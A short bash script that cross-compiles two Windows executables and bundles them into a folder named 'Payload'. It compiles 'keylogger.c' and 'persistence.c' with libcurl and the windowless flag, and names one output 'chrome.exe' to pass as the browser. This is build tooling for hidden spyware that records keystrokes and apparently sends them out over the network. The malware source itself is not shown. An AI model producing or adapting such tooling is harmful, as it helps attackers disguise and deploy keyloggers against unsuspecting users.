#!/bin/bash

# Build the EXE files
x86_64-w64-mingw32-gcc -o chrome.exe persistence.c -lcurl -mwindows
x86_64-w64-mingw32-gcc -o engine.exe keylogger.c -lcurl -mwindows

# Copy the DLLs and the EXE files to one folder
rm -rf Payload || true
mkdir Payload
cp DLLs/* Payload && cp *.exe Payload

# Confirm that the building is done
echo "The payload was built"
